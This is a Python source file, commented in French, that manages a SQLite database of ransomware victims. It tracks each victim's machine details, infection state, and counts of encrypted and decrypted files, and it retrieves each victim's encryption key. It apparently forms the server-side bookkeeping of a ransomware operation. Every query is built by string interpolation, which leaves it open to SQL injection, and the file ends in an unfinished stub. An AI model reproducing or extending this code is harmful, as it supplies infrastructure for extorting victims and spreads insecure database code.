import sqlite3

DB_FILNAME = "data/victims.sqlite"

REQUETE_VICTIMS = """
SELECT vi.id_victim, vi.hash, vi.os, vi.disks, (SELECT st.state 
                                                FROM states st 
                                                WHERE st.datetime = (SELECT MAX(datetime) 
                                                                    FROM states s 
                                                                    JOIN victims v 
                                                                    ON v.id_victim=s.id_victim 
                                                                    WHERE vi.id_victim=v.id_victim))
FROM victims vi
"""


def connect_db():
    sqlite_connection = None
    try:
        sqlite_connection=sqlite3.connect(DB_FILNAME)
    except Exception as erreur:
        print(f"Erreur lors de la connexion : {DB_FILNAME} ({erreur})")
    if sqlite_connection:
        return sqlite_connection


def insert_data(conn, table, colonnes, data):
    requete_insert = f"INSERT INTO {table} {colonnes} VALUES {data}"

    try:
        curseur=conn.cursor()
        curseur.execute(requete_insert)
        conn.commit()
        curseur.close()
    except Exception as erreur:
        print(f"Erreur d'insert : {erreur}")


def select_data(conn, select_query):
    try:
        curseur=conn.cursor()
        curseur.execute(select_query)
        records = curseur.fetchall()
        curseur.close()
    except Exception as erreur:
        print(f"Erreur lors du select : {erreur}\n\n{select_query}")
    else:
        return records


def select_data_script(conn, select_query):
    try:
        curseur=conn.cursor()
        curseur.executescript(select_query)
        records=curseur.fetchall()
        curseur.close()
    except Exception as erreur:
        print(f"Erreur lors du select (script) : {erreur}")
    else:
        return records


def get_list_victims(conn):
    victims = select_data(conn, REQUETE_VICTIMS)
    k = 0
    victims_list = []
    for victim in victims:
        victims_list.append(list(victim)) #Transformation en tableau car tuple non modifiable
        #Récupère les fichiers cryptés
        if victim[4] in ('CRYPT', 'PENDING'):
            requete = f"""
            SELECT encrypted.nb_files
            FROM encrypted
            WHERE encrypted.id_victim = {victim[0]}
                AND encrypted.datetime = (select MAX(datetime)
                                            FROM encrypted
                                            WHERE id_victim = {victim[0]})"""
            fichiers = select_data(conn, requete)
            if not fichiers:
                fichiers = 0
            else:
                fichiers = fichiers[0][0]
            victims_list[k].append(fichiers)
        #Récupère les fichiers décryptés
        elif victim[4] in ('DECRYPT', 'PROTECTED'):
            requete = f"""
            SELECT decrypted.nb_files
            FROM decrypted
            WHERE decrypted.id_victim = {victim[0]}
                AND decrypted.datetime = (SELECT MAX(datetime)
                                            FROM decrypted
                                            WHERE id_victim={victim[0]})"""
            fichiers = select_data(conn, requete)
            if not fichiers:
                fichiers = 0
            else:
                fichiers = fichiers[0][0]
            victims_list[k].append(fichiers)
        #Si la victime est à un autre "state" on met 0 fichiers par defaut
        else:
            victims_list[k].append(0)
        k += 1

    return victims_list


def get_list_history(conn, id_victim):
    historiques_list=[]
    requete=f"""
            SELECT id_victim, datetime, state
            FROM states
            WHERE id_victim={id_victim}"""
    historiques=select_data(conn, requete)

    k=0
    for historique in historiques:
        historiques_list.append(list(historique)) #Transformation en tableau car tuple non modifiable
        if historique[2] in ("CRYPT", "PENDING"):
            requete=f"""
                    SELECT nb_files
                    FROM encrypted
                    WHERE id_victim={id_victim} AND datetime={historique[1]}"""
            files=select_data(conn, requete)
            if not files:
                files=0
            else:
                files=files[0][0]
            historiques_list[k].append(files)
        elif historique[2] in ("DECRYPT", "PROTECTED"):
            requete=f"""
                    SELECT nb_files
                    FROM decrypted
                    WHERE id_victim={id_victim} AND datetime={historique[1]}"""
            files=select_data(conn, requete)
            if not files:
                files=0
            else:
                files=files[0][0]
            historiques_list[k].append(files)
        # Si la victime est à un autre "state" on met 0 fichiers par defaut
        else:
            files=0
            historiques_list[k].append(files)
        k+=1
    return historiques_list


def get_last_id(conn):
    requete = f"""
                SELECT seq
                FROM sqlite_sequence
                WHERE name=='victims'"""
    last_id = select_data(conn, requete)
    return last_id[0][0]


def get_encryption_key(conn, victim_id):
    requete=f"""
            SELECT key
            FROM victims
            WHERE id_victim='{victim_id}'
    """
    key=select_data(conn, requete)
    return key[0][0]


def get_crypted_files(conn, victim_id):
    requete=f"""
            SELECT nb_files
            FROM encrypted
            WHERE datetime = (SELECT MAX(datetime) 
                                 FROM encrypted en
                                 WHERE en.id_victim={victim_id})
                  AND id_victim={victim_id}
    """
    nb_files = select_data(conn, requete)
    return nb_files[0][0]


"""def check_hash(conn, hash_victim):
    

    :param conn:
    :param hash_victim:
    :return:
"""

